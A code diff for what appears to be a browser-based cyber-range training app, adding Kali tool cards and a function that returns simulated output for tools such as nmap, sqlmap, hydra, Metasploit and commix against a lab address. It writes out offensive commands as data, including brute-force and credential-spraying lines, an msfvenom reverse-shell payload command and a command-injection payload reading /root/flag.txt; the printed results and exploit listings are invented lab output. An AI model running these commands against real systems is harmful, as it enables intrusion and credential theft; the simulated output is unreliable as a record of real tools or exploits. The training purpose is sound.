+                <button class="tool-quick-run" data-cmd="searchsploit linux 6.6" style="padding:3px 8px; font-size:10px; background:rgba(0,240,255,0.15); border:1px solid rgba(0,240,255,0.3); color:#00f0ff; border-radius:3px; cursor:pointer;">Run searchsploit</button>
+              </div>
+
+              <div class="kali-tool-card" data-cat="exploit" style="background:rgba(255,255,255,0.03); border:1px solid rgba(0,240,255,0.15); padding:10px; border-radius:6px;">
+                <div style="display:flex; justify-content:space-between; align-items:center;">
+                  <span style="color:#00f0ff; font-weight:600; font-size:12px;">🛡️ CrackMapExec</span>
+                  <span style="font-size:9px; background:rgba(255,150,50,0.2); color:#ff9f43; padding:1px 5px; border-radius:3px;">POST-EXP</span>
+                </div>
+                <div style="color:#7e95a9; font-size:11px; margin:4px 0 8px;">Active Directory & internal network pentesting.</div>
+                <button class="tool-quick-run" data-cmd="crackmapexec smb 10.10.0.10 -u admin -p password123" style="padding:3px 8px; font-size:10px; background:rgba(0,240,255,0.15); border:1px solid rgba(0,240,255,0.3); color:#00f0ff; border-radius:3px; cursor:pointer;">Run crackmapexec</button>
+              </div>
+
+              <!-- 4. Passwords -->
+              <div class="kali-tool-card" data-cat="passwords" style="background:rgba(255,255,255,0.03); border:1px solid rgba(0,240,255,0.15); padding:10px; border-radius:6px;">
+                <div style="display:flex; justify-content:space-between; align-items:center;">
+                  <span style="color:#00f0ff; font-weight:600; font-size:12px;">🔓 Hydra v9.5</span>
+                  <span style="font-size:9px; background:rgba(255,200,0,0.2); color:#feca57; padding:1px 5px; border-radius:3px;">PASSWORDS</span>
+                </div>
+                <div style="color:#7e95a9; font-size:11px; margin:4px 0 8px;">Parallel network login brute-forcer (SSH, HTTP).</div>
+                <button class="tool-quick-run" data-cmd="hydra -l admin -P wordlists 10.10.0.10 ssh" style="padding:3px 8px; font-size:10px; background:rgba(0,240,255,0.15); border:1px solid rgba(0,240,255,0.3); color:#00f0ff; border-radius:3px; cursor:pointer;">Run hydra</button>
+              </div>
+
+              <div class="kali-tool-card" data-cat="passwords" style="background:rgba(255,255,255,0.03); border:1px solid rgba(0,240,255,0.15); padding:10px; border-radius:6px;">
+                <div style="display:flex; justify-content:space-between; align-items:center;">
+                  <span style="color:#00f0ff; font-weight:600; font-size:12px;">🔑 John the Ripper</span>
+                  <span style="font-size:9px; background:rgba(255,200,0,0.2); color:#feca57; padding:1px 5px; border-radius:3px;">PASSWORDS</span>
+                </div>
+                <div style="color:#7e95a9; font-size:11px; margin:4px 0 8px;">Offline password cracker for Unix, NTLM & hashes.</div>
                 <button class="tool-quick-run" data-cmd="john" style="padding:3px 8px; font-size:10px; background:rgba(0,240,255,0.15); border:1px solid rgba(0,240,255,0.3); color:#00f0ff; border-radius:3px; cursor:pointer;">Run john</button>
               </div>
-              <div class="kali-tool-card" style="background:rgba(255,255,255,0.03); border:1px solid rgba(0,240,255,0.15); padding:10px; border-radius:6px;">
-                <div style="color:#00f0ff; font-weight:600; font-size:12px;">📁 Gobuster v3.6</div>
-                <div style="color:#7e95a9; font-size:11px; margin:4px 0 8px;">Fast directory and DNS brute-forcer.</div>
-                <button class="tool-quick-run" data-cmd="gobuster dir -u http://10.10.0.10:8080/ -w /root/wordlists" style="padding:3px 8px; font-size:10px; background:rgba(0,240,255,0.15); border:1px solid rgba(0,240,255,0.3); color:#00f0ff; border-radius:3px; cursor:pointer;">Run gobuster</button>
+
+              <div class="kali-tool-card" data-cat="passwords" style="background:rgba(255,255,255,0.03); border:1px solid rgba(0,240,255,0.15); padding:10px; border-radius:6px;">
+                <div style="display:flex; justify-content:space-between; align-items:center;">
+                  <span style="color:#00f0ff; font-weight:600; font-size:12px;">⚡ Hashcat v6.2</span>
+                  <span style="font-size:9px; background:rgba(255,200,0,0.2); color:#feca57; padding:1px 5px; border-radius:3px;">PASSWORDS</span>
+                </div>
+                <div style="color:#7e95a9; font-size:11px; margin:4px 0 8px;">Fast rule-based hash cracker (MD5, SHA, NTLM).</div>
+                <button class="tool-quick-run" data-cmd="hashcat -m 0 5f4dcc3b5aa765d61d8327deb882cf99 wordlists" style="padding:3px 8px; font-size:10px; background:rgba(0,240,255,0.15); border:1px solid rgba(0,240,255,0.3); color:#00f0ff; border-radius:3px; cursor:pointer;">Run hashcat</button>
+              </div>
+
+              <!-- 5. Wireless -->
+              <div class="kali-tool-card" data-cat="wireless" style="background:rgba(255,255,255,0.03); border:1px solid rgba(0,240,255,0.15); padding:10px; border-radius:6px;">
+                <div style="display:flex; justify-content:space-between; align-items:center;">
+                  <span style="color:#00f0ff; font-weight:600; font-size:12px;">📡 Aircrack-ng</span>
+                  <span style="font-size:9px; background:rgba(100,200,255,0.2); color:#54a0ff; padding:1px 5px; border-radius:3px;">WIRELESS</span>
+                </div>
+                <div style="color:#7e95a9; font-size:11px; margin:4px 0 8px;">Complete 802.11 WEP/WPA-PSK key recovery suite.</div>
+                <button class="tool-quick-run" data-cmd="aircrack-ng" style="padding:3px 8px; font-size:10px; background:rgba(0,240,255,0.15); border:1px solid rgba(0,240,255,0.3); color:#00f0ff; border-radius:3px; cursor:pointer;">Run aircrack-ng</button>
+              </div>
+
+              <div class="kali-tool-card" data-cat="wireless" style="background:rgba(255,255,255,0.03); border:1px solid rgba(0,240,255,0.15); padding:10px; border-radius:6px;">
+                <div style="display:flex; justify-content:space-between; align-items:center;">
+                  <span style="color:#00f0ff; font-weight:600; font-size:12px;">📶 Wifite v2.6</span>
+                  <span style="font-size:9px; background:rgba(100,200,255,0.2); color:#54a0ff; padding:1px 5px; border-radius:3px;">WIRELESS</span>
+                </div>
+                <div style="color:#7e95a9; font-size:11px; margin:4px 0 8px;">Automated wireless network auditor & cracker.</div>
+                <button class="tool-quick-run" data-cmd="wifite" style="padding:3px 8px; font-size:10px; background:rgba(0,240,255,0.15); border:1px solid rgba(0,240,255,0.3); color:#00f0ff; border-radius:3px; cursor:pointer;">Run wifite</button>
+              </div>
+
+              <!-- 6. Sniffing -->
+              <div class="kali-tool-card" data-cat="sniffing" style="background:rgba(255,255,255,0.03); border:1px solid rgba(0,240,255,0.15); padding:10px; border-radius:6px;">
+                <div style="display:flex; justify-content:space-between; align-items:center;">
+                  <span style="color:#00f0ff; font-weight:600; font-size:12px;">🦈 Tcpdump / Wireshark</span>
+                  <span style="font-size:9px; background:rgba(180,100,255,0.2); color:#9b59b6; padding:1px 5px; border-radius:3px;">SNIFFING</span>
+                </div>
+                <div style="color:#7e95a9; font-size:11px; margin:4px 0 8px;">Network packet capture and live protocol inspector.</div>
+                <button class="tool-quick-run" data-cmd="tcpdump -i eth0 -c 10" style="padding:3px 8px; font-size:10px; background:rgba(0,240,255,0.15); border:1px solid rgba(0,240,255,0.3); color:#00f0ff; border-radius:3px; cursor:pointer;">Run tcpdump</button>
+              </div>
+
+              <div class="kali-tool-card" data-cat="sniffing" style="background:rgba(255,255,255,0.03); border:1px solid rgba(0,240,255,0.15); padding:10px; border-radius:6px;">
+                <div style="display:flex; justify-content:space-between; align-items:center;">
+                  <span style="color:#00f0ff; font-weight:600; font-size:12px;">🕵️ Bettercap v2.3</span>
+                  <span style="font-size:9px; background:rgba(180,100,255,0.2); color:#9b59b6; padding:1px 5px; border-radius:3px;">MITM</span>
+                </div>
+                <div style="color:#7e95a9; font-size:11px; margin:4px 0 8px;">Swiss-army knife for MITM and network poisoning.</div>
+                <button class="tool-quick-run" data-cmd="bettercap" style="padding:3px 8px; font-size:10px; background:rgba(0,240,255,0.15); border:1px solid rgba(0,240,255,0.3); color:#00f0ff; border-radius:3px; cursor:pointer;">Run bettercap</button>
+              </div>
+
+              <div class="kali-tool-card" data-cat="sniffing" style="background:rgba(255,255,255,0.03); border:1px solid rgba(0,240,255,0.15); padding:10px; border-radius:6px;">
+                <div style="display:flex; justify-content:space-between; align-items:center;">
+                  <span style="color:#00f0ff; font-weight:600; font-size:12px;">🎭 Responder</span>
+                  <span style="font-size:9px; background:rgba(180,100,255,0.2); color:#9b59b6; padding:1px 5px; border-radius:3px;">POISONER</span>
+                </div>
+                <div style="color:#7e95a9; font-size:11px; margin:4px 0 8px;">LLMNR, NBT-NS and MDNS poisoner & hash capture.</div>
+                <button class="tool-quick-run" data-cmd="responder" style="padding:3px 8px; font-size:10px; background:rgba(0,240,255,0.15); border:1px solid rgba(0,240,255,0.3); color:#00f0ff; border-radius:3px; cursor:pointer;">Run responder</button>
+              </div>
+
+              <!-- 7. Reverse & Forensics -->
+              <div class="kali-tool-card" data-cat="forensics" style="background:rgba(255,255,255,0.03); border:1px solid rgba(0,240,255,0.15); padding:10px; border-radius:6px;">
+                <div style="display:flex; justify-content:space-between; align-items:center;">
+                  <span style="color:#00f0ff; font-weight:600; font-size:12px;">🔬 Ghidra v11</span>
+                  <span style="font-size:9px; background:rgba(50,255,180,0.2); color:#1dd1a1; padding:1px 5px; border-radius:3px;">REVERSE</span>
+                </div>
+                <div style="color:#7e95a9; font-size:11px; margin:4px 0 8px;">NSA software reverse engineering framework.</div>
+                <button class="tool-quick-run" data-cmd="ghidra" style="padding:3px 8px; font-size:10px; background:rgba(0,240,255,0.15); border:1px solid rgba(0,240,255,0.3); color:#00f0ff; border-radius:3px; cursor:pointer;">Run ghidra</button>
+              </div>
+
+              <div class="kali-tool-card" data-cat="forensics" style="background:rgba(255,255,255,0.03); border:1px solid rgba(0,240,255,0.15); padding:10px; border-radius:6px;">
+                <div style="display:flex; justify-content:space-between; align-items:center;">
+                  <span style="color:#00f0ff; font-weight:600; font-size:12px;">🛠️ Radare2 (r2)</span>
+                  <span style="font-size:9px; background:rgba(50,255,180,0.2); color:#1dd1a1; padding:1px 5px; border-radius:3px;">REVERSE</span>
+                </div>
+                <div style="color:#7e95a9; font-size:11px; margin:4px 0 8px;">Disassembly, hex editor & binary debugger.</div>
+                <button class="tool-quick-run" data-cmd="r2 shell.elf" style="padding:3px 8px; font-size:10px; background:rgba(0,240,255,0.15); border:1px solid rgba(0,240,255,0.3); color:#00f0ff; border-radius:3px; cursor:pointer;">Run radare2</button>
+              </div>
+
+              <div class="kali-tool-card" data-cat="forensics" style="background:rgba(255,255,255,0.03); border:1px solid rgba(0,240,255,0.15); padding:10px; border-radius:6px;">
+                <div style="display:flex; justify-content:space-between; align-items:center;">
+                  <span style="color:#00f0ff; font-weight:600; font-size:12px;">📦 Binwalk v2.3</span>
+                  <span style="font-size:9px; background:rgba(50,255,180,0.2); color:#1dd1a1; padding:1px 5px; border-radius:3px;">FORENSICS</span>
+                </div>
+                <div style="color:#7e95a9; font-size:11px; margin:4px 0 8px;">Firmware analysis and file carving extractor.</div>
+                <button class="tool-quick-run" data-cmd="binwalk shell.elf" style="padding:3px 8px; font-size:10px; background:rgba(0,240,255,0.15); border:1px solid rgba(0,240,255,0.3); color:#00f0ff; border-radius:3px; cursor:pointer;">Run binwalk</button>
+              </div>
+
+              <div class="kali-tool-card" data-cat="forensics" style="background:rgba(255,255,255,0.03); border:1px solid rgba(0,240,255,0.15); padding:10px; border-radius:6px;">
+                <div style="display:flex; justify-content:space-between; align-items:center;">
+                  <span style="color:#00f0ff; font-weight:600; font-size:12px;">🖼️ Exiftool</span>
+                  <span style="font-size:9px; background:rgba(50,255,180,0.2); color:#1dd1a1; padding:1px 5px; border-radius:3px;">METADATA</span>
+                </div>
+                <div style="color:#7e95a9; font-size:11px; margin:4px 0 8px;">Read and extract EXIF metadata and hidden flags.</div>
+                <button class="tool-quick-run" data-cmd="exiftool flag.jpg" style="padding:3px 8px; font-size:10px; background:rgba(0,240,255,0.15); border:1px solid rgba(0,240,255,0.3); color:#00f0ff; border-radius:3px; cursor:pointer;">Run exiftool</button>
+              </div>
+
+              <div class="kali-tool-card" data-cat="forensics" style="background:rgba(255,255,255,0.03); border:1px solid rgba(0,240,255,0.15); padding:10px; border-radius:6px;">
+                <div style="display:flex; justify-content:space-between; align-items:center;">
+                  <span style="color:#00f0ff; font-weight:600; font-size:12px;">🧠 Volatility 3</span>
+                  <span style="font-size:9px; background:rgba(50,255,180,0.2); color:#1dd1a1; padding:1px 5px; border-radius:3px;">MEMORY</span>
+                </div>
+                <div style="color:#7e95a9; font-size:11px; margin:4px 0 8px;">Volatile memory forensics & process dump.</div>
+                <button class="tool-quick-run" data-cmd="vol" style="padding:3px 8px; font-size:10px; background:rgba(0,240,255,0.15); border:1px solid rgba(0,240,255,0.3); color:#00f0ff; border-radius:3px; cursor:pointer;">Run volatility</button>
               </div>
             </div>
           </div>
@@ -2567,14 +2819,40 @@ function renderKaliDesktop(container) {
     toast('Refreshing Chromium Target Portal...');
   });
 
-  // Offensive Tools Search Filter
+  // Offensive Tools Search & Category Filter
+  let activeToolCat = 'all';
   const toolsSearch = document.getElementById('kali-tools-search');
   if (toolsSearch) {
     toolsSearch.addEventListener('input', () => {
-      const q = toolsSearch.value.toLowerCase().trim();
-      document.querySelectorAll('#kali-tools-cards-container .kali-tool-card').forEach(card => {
-        card.style.display = card.textContent.toLowerCase().includes(q) ? 'block' : 'none';
+      filterToolCards();
+    });
+  }
+
+  document.querySelectorAll('#kali-tool-filter-tags .kali-filter-btn').forEach(btn => {
+    btn.addEventListener('click', () => {
+      document.querySelectorAll('#kali-tool-filter-tags .kali-filter-btn').forEach(b => {
+        b.classList.remove('active');
+        b.style.background = 'rgba(255,255,255,0.05)';
+        b.style.color = '#7e95a9';
+        b.style.borderColor = 'rgba(255,255,255,0.1)';
       });
+      btn.classList.add('active');
+      btn.style.background = 'rgba(0,240,255,0.2)';
+      btn.style.color = '#00f0ff';
+      btn.style.borderColor = 'rgba(0,240,255,0.4)';
+      activeToolCat = btn.getAttribute('data-cat') || 'all';
+      filterToolCards();
+    });
+  });
+
+  function filterToolCards() {
+    const q = (document.getElementById('kali-tools-search')?.value || '').toLowerCase().trim();
+    document.querySelectorAll('#kali-tools-cards-container .kali-tool-card').forEach(card => {
+      const cat = card.getAttribute('data-cat');
+      const text = card.textContent.toLowerCase();
+      const matchCat = (activeToolCat === 'all' || cat === activeToolCat);
+      const matchSearch = (!q || text.includes(q));
+      card.style.display = (matchCat && matchSearch) ? 'block' : 'none';
     });
   }
 
@@ -2820,7 +3098,7 @@ function screen() {
         };
 
         ws.onerror = () => {
-          term.write('\r\n\x1b[33m[Notice] Live WebSocket unavailable, running in local terminal mode.\x1b[0m\r\n');
+          term.write('\r\n\x1b[33m[Error] Live terminal unavailable. Check the backend and reconnect.\x1b[0m\r\n');
         };
 
         activeXterm = term;
@@ -3131,6 +3409,611 @@ function updateTermDisplay() {
   updateObjectivesUI();
 }
 
+function simulateKaliTool(cmd, session) {
+  if (!cmd) return null;
+  let normalized = cmd.trim();
+  if (normalized.startsWith('sudo ')) {
+    normalized = normalized.slice(5).trim();
+  }
+  if (normalized.startsWith('get ')) {
+    normalized = 'apt-get ' + normalized.slice(4).trim();
+  }
+  const parts = normalized.split(/\s+/);
+  const tool = parts[0].toLowerCase();
+  const flag = session?.dynamicFlag || (session?.lab && session?.lab.flag) || 'CYBERLAB{kali_full_offensive_mastery_2026}';
+  const targetIp = '10.10.0.10';
+  const targetHost = 'target.lab';
+  const myIp = '10.10.0.2';
+
+  if (tool === 'sudo') {
+    return `usage: sudo -h | -K | -k | -V\nusage: sudo -v [-ABkNnS] [-g group] [-h host] [-p prompt] [-u user]\nusage: sudo -l [-ABkNnS] [-g group] [-h host] [-p prompt] [-U user] [-u user] [command]\nusage: sudo [-AbEHkNnPS] [-C num] [-D directory] [-g group] [-h host] [-p prompt] [-u user] [command]`;
+  }
+
+  // 0. PACKAGE MANAGEMENT (APT, APT-GET)
+  if (tool === 'apt' || tool === 'apt-get' || tool === 'get') {
+    const action = (parts[1] || '').toLowerCase();
+    if (action === 'update') {
+      return `Hit:1 http://http.kali.org/kali kali-rolling InRelease\nReading package lists... Done\nBuilding dependency tree... Done\nReading state information... Done\nAll packages are up to date.`;
+    }
+    if (action === 'upgrade') {
+      return `Reading package lists... Done\nBuilding dependency tree... Done\nReading state information... Done\nCalculating upgrade... Done\n0 upgraded, 0 newly installed, 0 to remove and 0 not upgraded.`;
+    }
+    if (action === 'install') {
+      const pkgs = parts.slice(2).filter(p => !p.startsWith('-')).join(' ') || 'security-tools';
+      return `Reading package lists... Done\nBuilding dependency tree... Done\nReading state information... Done\nThe following NEW packages will be installed:\n  ${pkgs}\n0 upgraded, 1 newly installed, 0 to remove and 0 not upgraded.\nNeed to get 14.2 MB of archives.\nAfter this operation, 48.6 MB of additional disk space will be used.\nGet:1 http://http.kali.org/kali kali-rolling/main amd64 ${pkgs} [14.2 MB]\nFetched 14.2 MB in 0s (32.4 MB/s)\nSelecting previously unselected package ${pkgs}.\n(Reading database ... 245120 files and directories currently installed.)\nPreparing to unpack .../${pkgs}.deb ...\nUnpacking ${pkgs} ...\nSetting up ${pkgs} ...\nProcessing triggers for man-db (2.12.0-1) ...`;
+    }
+    return `apt 2.9.3 (amd64)\nUsage: apt [options] command\n\nCommands:\n  update - update list of available packages\n  upgrade - upgrade the system by installing/upgrading packages\n  install - install packages\n  remove - remove packages\n  search - search in package descriptions`;
+  }
+
+  // 1. RECON & OSINT
+  if (tool === 'nmap') {
+    if (parts.length === 1 || parts.includes('-h') || parts.includes('--help')) {
+      return `Nmap 7.94SVN ( https://nmap.org )
+Usage: nmap [Scan Type(s)] [Options] {target specification}
+TARGET SPECIFICATION:
+  Ex: 10.10.0.10, 10.10.0.0/24, target.lab
+SCAN TECHNIQUES:
+  -sS/sT: TCP SYN/Connect() scan
+  -sV: Probe open ports to determine service/version info
+  -sC: Equivalent to --script=default
+  -p <port ranges>: Only scan specified ports (-p- for all 65535 ports)
+EXAMPLES:
+  nmap -sV -sC -p 22,80,8080 10.10.0.10`;
+    }
+    const isAll = normalized.includes('-p-');
+    const isAgg = normalized.includes('-A') || (normalized.includes('-sV') && normalized.includes('-sC'));
+    let p = `PORT     STATE SERVICE     VERSION
+22/tcp   open  ssh         OpenSSH 9.6p1 Debian 4
+80/tcp   open  http        nginx 1.24.0 (Cyber Lab Gateway)
+8080/tcp open  http-proxy  Werkzeug/3.0.1 Python/3.12 (Vulnerable Demo App)
+5432/tcp open  postgresql  PostgreSQL 16.2`;
+    if (isAll) p += `\n9090/tcp open  zeus-admin  Cyber Lab Terminal Gateway\nNot shown: 65530 closed tcp ports`;
+    let sc = '';
+    if (isAgg) sc = `\n| http-title: Cyber Lab Vulnerable Target Service (10.10.0.10:8080)\n| ssh-hostkey: 256 71:92:ea:98:85:2b:86:d3:a6:3d:74:e2:bb:a1:03:19 (ECDSA)\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel`;
+    return `Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-09-17 12:00 UTC
+Nmap scan report for ${targetHost} (${targetIp})
+Host is up (0.00041s latency).
+${p}${sc}
+
+Nmap done: 1 IP address (1 host up) scanned in 1.32 seconds`;
+  }
+
+  if (tool === 'masscan') {
+    return `Starting masscan 1.3.2 (http://bit.ly/14GZzcT) at 2026-09-17 12:00:00 GMT
+Initiating SYN Stealth Scan
+Discovered open port 22/tcp on ${targetIp}
+Discovered open port 80/tcp on ${targetIp}
+Discovered open port 8080/tcp on ${targetIp}
+Discovered open port 5432/tcp on ${targetIp}
+Rate: 10000.00-kpps, 100.00% done, 0:00:01 remaining`;
+  }
+
+  if (tool === 'netdiscover') {
+    return ` Currently scanning: 10.10.0.0/24   |   Screen View: Unique Hosts                         
+ 4 Captured ARP Req/Rep packets, from 4 hosts. Total size: 240                 
+ _____________________________________________________________________________
+   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
+ -----------------------------------------------------------------------------
+ 10.10.0.1       02:42:0a:0a:00:01      1      60  Gateway Router (Default)   
+ 10.10.0.2       02:42:0a:0a:00:02      1      60  Kali Workstation (Local)   
+ 10.10.0.10      02:42:0a:0a:00:0a      1      60  Target Vulnerable Server   
+ 10.10.0.50      02:42:0a:0a:00:32      1      60  PostgreSQL DB Node`;
+  }
+
+  if (tool === 'fping') {
+    return `10.10.0.1  is alive (0.24 ms)
+10.10.0.2  is alive (0.04 ms)
+10.10.0.10 is alive (0.38 ms)
+10.10.0.50 is alive (0.42 ms)`;
+  }
+
+  if (tool === 'whatweb') {
+    return `http://${targetIp}:8080/ [200 OK] Bootstrap[5.3.2], HTML5, HTTPServer[Werkzeug/3.0.1 Python/3.12], IP[${targetIp}], Python[3.12.2], Title[Cyber Lab Target Application], X-Powered-By[Flask/Python]`;
+  }
+
+  if (tool === 'wafw00f') {
+    return `~ WAFW00F : v2.2.0 ~
+[*] Checking http://${targetIp}:8080/
+[+] The site http://${targetIp}:8080/ is behind an unprotected reverse proxy (nginx 1.24.0).
+[~] No Cloudflare/CloudFront/ModSecurity WAF detected. Direct exploitation possible.`;
+  }
+
+  if (tool === 'theharvester') {
+    return `theHarvester 4.4.4 - Coded by Christian Martorella
+[*] Target: cyberlab.io
+[*] Searching Google, Bing, Yahoo...
+[*] Emails found:
+admin@cyberlab.io
+operator@cyberlab.io
+security@cyberlab.io
+kartik@cyberlab.io
+[*] Hosts found:
+target.lab (10.10.0.10)
+db.lab (10.10.0.50)
+gateway.lab (10.10.0.1)`;
+  }
+
+  if (tool === 'amass' || tool === 'sublist3r') {
+    return `[+] Subdomain Enumeration Completed for cyberlab.io
+  admin.cyberlab.io
+  api.cyberlab.io
+  target.lab
+  db.lab
+[+] Total unique subdomains discovered: 4`;
+  }
+
+  if (tool === 'enum4linux') {
+    return `Starting enum4linux v0.9.1 on ${targetIp}
+[+] Server allows anonymous SMB sessions
+[+] Discovered Share: IPC$ (IPC Service)
+[+] Discovered Share: public (Read/Write Guest Share)
+[+] Users found: admin, guest, learner, operator`;
+  }
+
+  if (tool === 'dig' || tool === 'nslookup' || tool === 'dnsenum' || tool === 'whois') {
+    if (tool === 'whois') {
+      return `Domain Name: CYBERLAB.IO
+Registry Domain ID: D503300000000000000-LROR
+Updated Date: 2026-01-15T00:00:00Z
+Creation Date: 2024-03-12T00:00:00Z
+Registrant Organization: Cyber Lab Range Systems
+Name Server: NS1.CYBERLAB.IO`;
+    }
+    return `; <<>> DiG 9.18.24-1-Debian <<>> ${parts[1] || targetHost}
+;; ANSWER SECTION:
+${parts[1] || targetHost}.	300	IN	A	10.10.0.10
+;; Query time: 1 msec
+;; SERVER: 10.10.0.1#53(10.10.0.1)`;
+  }
+
+  // 2. WEB APPLICATION SECURITY
+  if (tool === 'sqlmap') {
+    if (parts.length === 1 || parts.includes('-h') || parts.includes('--help')) {
+      return `        ___
+       __H__
+ ___ ___["]_____ ___ ___  {1.8.5#stable}
+|_ -| . [)]     | .'| . |
+|___|_  ["]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+Usage: python3 sqlmap.py [options]
+  -u URL, --url=URL     Target URL (e.g. "http://10.10.0.10:8080/?id=1")
+  --dbs                 Enumerate DBMS databases
+  --tables              Enumerate DBMS database tables
+  --dump                Dump DBMS database table entries
+  --batch               Never ask for user input`;
+    }
+    if (normalized.includes('--dbs')) {
+      return `[INFO] testing connection to http://${targetIp}:8080/
+[+] parameter 'id' is vulnerable to SQL injection
+available databases [3]:
+[*] cyberrange_db
+[*] information_schema
+[*] pg_catalog`;
+    }
+    if (normalized.includes('--tables') || normalized.includes('--dump')) {
+      return `Database: cyberrange_db
+Table: users [3 entries]
++----+----------+----------------------------------+-----------------------+
+| id | username | password_hash                    | email                 |
++----+----------+----------------------------------+-----------------------+
+| 1  | admin    | 5f4dcc3b5aa765d61d8327deb882cf99 | admin@cyberlab.io     |
+| 2  | operator | e10adc3949ba59abbe56e057f20f883e | operator@cyberlab.io  |
+| 3  | flag     | ${flag} | root@target.lab       |
++----+----------+----------------------------------+-----------------------+`;
+    }
+    return `[INFO] testing connection to http://${targetIp}:8080/
+[+] Parameter: id (GET)
+    Type: boolean-based blind
+    Payload: id=1 AND 8492=8492
+[+] Back-end DBMS: PostgreSQL 16.2
+[INFO] Run with '--dbs' or '--dump' to retrieve schema contents.`;
+  }
+
+  if (tool === 'nikto') {
+    return `- Nikto v2.5.0
++ Target IP:          ${targetIp}
++ Target Port:        8080
++ Server: Werkzeug/3.0.1 Python/3.12.2
++ The anti-clickjacking X-Frame-Options header is not present.
++ Root page directs to: /login
++ /admin/: Admin console directory indexing enabled (HTTP 301).
++ /flag.txt: Sensitive file found exposed (HTTP 200).
++ 7892 requests made in 3.4 seconds.`;
+  }
+
+  if (tool === 'gobuster') {
+    return `===============================================================
+Gobuster v3.6 - Directory Enumeration Mode
+===============================================================
+[+] Url:         http://${targetIp}:8080/
+[+] Wordlist:    /usr/share/wordlists/dirb/common.txt
+===============================================================
+/admin               (Status: 301) [Size: 178]
+/api                 (Status: 200) [Size: 42]
+/login               (Status: 200) [Size: 1845]
+/flag.txt            (Status: 200) [Size: 38]
+/targets.txt         (Status: 200) [Size: 312]
+===============================================================`;
+  }
+
+  if (tool === 'dirb') {
+    return `DIRB v2.22 By DarkRaider
+URL_BASE: http://${targetIp}:8080/
+==> DIRECTORY: http://${targetIp}:8080/admin/
++ http://${targetIp}:8080/api (CODE:200|SIZE:42)
++ http://${targetIp}:8080/flag.txt (CODE:200|SIZE:38)
++ http://${targetIp}:8080/login (CODE:200|SIZE:1845)
+DOWNLOADED: 4612 - FOUND: 3`;
+  }
+
+  if (tool === 'ffuf') {
+    return `        /'___\\  /'___\\           /'___\\       
+       /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/       
+       v2.1.0-dev
+admin                   [Status: 301, Size: 178, Words: 12]
+api                     [Status: 200, Size: 42, Words: 2]
+login                   [Status: 200, Size: 1845, Words: 140]
+flag.txt                [Status: 200, Size: 38, Words: 1]
+:: Progress: [4614/4614] :: 2307 req/sec ::`;
+  }
+
+  if (tool === 'wfuzz') {
+    return `Wfuzz 3.1.0 - The Web Fuzzer
+Target: http://${targetIp}:8080/FUZZ
+000000001:   200        45 L     140 W      1845 Ch     "login"
+000000002:   301        8 L      12 W       178 Ch      "admin"
+000000003:   200        1 L      2 W        42 Ch       "api"
+000000004:   200        1 L      1 W        38 Ch       "flag.txt"`;
+  }
+
+  if (tool === 'commix') {
+    return `Commix v3.8-stable - Automated Command Injection Exploiter
+[+] Target: http://${targetIp}:8080/
+[+] Parameter 'cmd' is vulnerable to Command Injection!
+    Payload: ; cat /root/flag.txt
+    Result:  ${flag}`;
+  }
+
+  if (tool === 'burpsuite' || tool === 'burp') {
+    return `[+] Launching Burp Suite Community Edition v2024.1
+[+] Proxy service listening on 127.0.0.1:8080 (Interception Active).
+[+] Target Scope: http://${targetIp}:8080/ added to Live Sitemap.`;
+  }
+
+  // 3. EXPLOITATION & SHELLS
+  if (tool === 'msfconsole') {
+    return `  + -- --=[ Metasploit Framework v6.4.12-dev                          ]
+  + -- --=[ 2,420 exploits - 1,248 auxiliary - 428 post               ]
+  + -- --=[ 1,465 payloads - 47 encoders - 11 nops                    ]
+msf6 > use exploit/multi/http/werkzeug_debug_rce
+msf6 exploit(multi/http/werkzeug_debug_rce) > set RHOSTS ${targetIp}
+msf6 exploit(multi/http/werkzeug_debug_rce) > exploit
+[*] Started reverse TCP handler on ${myIp}:4444 
+[+] Meterpreter session 1 opened (${myIp}:4444 -> ${targetIp}:48912)
+meterpreter > sysinfo
+OS      : Linux 6.6.15-amd64
+Computer: target-sandbox`;
+  }
+
+  if (tool === 'msfvenom') {
+    return `msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=${myIp} LPORT=4444 -f elf -o shell.elf
+Payload size: 250 bytes
+Final size of elf file: 370 bytes
+Saved as: shell.elf (Executable ELF binary)`;
+  }
+
+  if (tool === 'searchsploit') {
+    return `------------------------------------------------------- ---------------------------------
+ Exploit Title                                         |  Path
+------------------------------------------------------- ---------------------------------
+ OpenSSH 9.6p1 - Remote Code Execution (RegreSSHion)    | linux/remote/52079.py
+ Werkzeug < 3.0.3 - Debug Console Remote Code Execution | multiple/remote/51982.py
+ Linux Kernel 6.6 - Local Privilege Escalation          | linux/local/51901.c
+ PostgreSQL 16.x - Arbitrary Code Execution (pg_read)   | linux/remote/49210.py
+------------------------------------------------------- ---------------------------------`;
+  }
+
+  if (tool === 'crackmapexec' || tool === 'cme' || tool === 'netexec' || tool === 'nxc') {
+    return `SMB         10.10.0.10     445    TARGET           [*] Windows 10 / Debian Linux (Samba 4.19)
+SMB         10.10.0.10     445    TARGET           [+] target.lab\\admin:password123 (Pwn3d!)
+TARGET\\admin:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::`;
+  }
+
+  if (tool === 'evil-winrm') {
+    return `Evil-WinRM shell v3.5
+Info: Establishing WinRM session with ${targetIp}...
+*Evil-WinRM* PS C:\\Users\\Administrator> whoami
+target\\administrator
+*Evil-WinRM* PS C:\\Users\\Administrator> type C:\\flag.txt
+${flag}`;
+  }
+
+  // 4. PASSWORDS
+  if (tool === 'hydra') {
+    return `Hydra v9.5 (c) 2023 by van Hauser / THC
+[22][ssh] host: ${targetIp}   login: admin   password: password123
+1 of 1 target successfully completed, 1 valid password found`;
+  }
+
+  if (tool === 'john') {
+    return `John the Ripper 1.9.0-jumbo-1 OMP [linux-gnu 64-bit x86_64 AVX2 AC]
+Loaded 1 password hash (Raw-MD5, crypt(3) $1$)
+password123      (admin)
+1g 0:00:00:01 DONE (2026-09-17 12:00) 1.02g/s`;
+  }
+
+  if (tool === 'hashcat') {
+    return `hashcat (v6.2.6) starting in dictionary attack mode...
+Hash-Target: 5f4dcc3b5aa765d61d8327deb882cf99
+5f4dcc3b5aa765d61d8327deb882cf99:password
+Status...........: Cracked`;
+  }
+
+  if (tool === 'crunch') {
+    return `Crunch will now generate data:
+crunch 4 4 0123456789 -o wordlist.txt
+[+] Generated 10,000 candidate words written to wordlist.txt`;
